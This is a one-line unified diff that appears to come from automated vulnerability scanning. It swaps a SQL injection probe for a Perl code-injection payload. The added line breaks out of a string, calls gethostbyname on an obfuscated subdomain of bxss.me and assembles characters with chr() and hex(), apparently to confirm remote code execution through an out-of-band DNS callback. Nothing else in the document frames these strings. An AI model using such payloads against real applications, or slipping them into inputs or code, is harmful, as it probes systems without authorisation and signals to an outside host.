@@ -1,1 +1,1 @@
--1 OR 2+596-596-1=0+0+0+1
+".gethostbyname(lc("hittp"."sfezeglrb17a8.bxss.me."))."A".chr(67).chr(hex("58")).chr(99).chr(83).chr(100).chr(81)."
